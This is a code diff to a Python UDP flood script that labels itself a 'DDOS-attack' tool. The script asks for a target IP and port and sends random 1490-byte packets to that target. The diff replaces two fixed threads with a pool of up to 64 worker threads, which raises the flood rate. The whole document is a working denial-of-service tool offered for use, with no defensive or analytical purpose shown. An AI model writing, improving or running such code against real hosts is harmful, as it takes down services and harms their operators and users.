@@ -6,6 +6,7 @@ import socket
 import random
 # Code Time
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
 
 now = datetime.now()
 hour = now.hour
@@ -19,8 +20,12 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = os.urandom(1490)
 #############
 print("DDOS-attack")
-ip = input("IP Target:")
-port = int(input("Port:"))
+ip = input("IP Target: ")
+port = int(input("Port: "))
+thread = int(input("Thread: "))
+if thread > 64:
+    print("Thread cannot be greater than 64")
+    thread = int(input("Thread: "))
 
 print("ddos-attack start after 3 second")
 
@@ -39,9 +44,7 @@ def run_send(ip, port):
             port = 1
 
 
-t1 = threading.Thread(target=run_send, args=(ip, port))
-t2 = threading.Thread(target=run_send, args=(ip, port))
-t1.start()
-t2.start()
-t1.join()
-t2.join()
+executor = ThreadPoolExecutor(max_workers=64)
+for i in range(thread):
+    executor.submit(run_send, ip, port)
+
